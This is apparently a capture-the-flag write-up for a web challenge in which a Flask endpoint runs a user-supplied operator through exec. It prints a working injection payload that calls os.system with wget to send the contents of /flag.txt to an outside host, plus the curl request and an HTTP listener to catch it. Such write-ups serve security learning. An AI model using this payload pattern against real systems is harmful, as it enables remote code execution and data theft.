# [Web] Evaluation deck

This challenge presents a web application that presents an API to perform an operation. It takes 2 numbers and 1 operator, and evaluates the corresponding code

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')

    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

We can use the following payload, replacing the operator by a system call

```json
{"current_health":"0", "attack_power":"0", "operator": ";__import__('os').system('wget 1.2.3.4:4444?aaa=`cat /flag.txt`');"}
```

And use it

```bash
curl -d @payload.txt  http://157.245.42.104:32089/api/get_health
```

Using a python listener, the flag is received

```bash
python -m http.server 4444
```
